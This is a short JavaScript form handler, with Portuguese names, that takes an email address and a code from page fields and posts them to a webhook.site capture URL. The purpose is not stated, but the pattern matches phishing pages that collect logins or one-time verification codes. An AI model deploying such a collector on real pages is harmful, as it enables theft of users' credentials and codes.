function enviarDados() {
  const email = document.getElementById('email').value;
  const codigo = document.getElementById('codigo').value;


  const url = 'https://webhook.site/a0cb9279-32e2-484f-a7e0-5c560d046475';

  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      email: email,
      codigo: codigo
    })
  })
  .then(response => {
    document.getElementById('mensagemSucesso').style.display = 'block';
  })
  .catch(error => {
    alert('Erro ao enviar. Tente novamente.');
  });
}
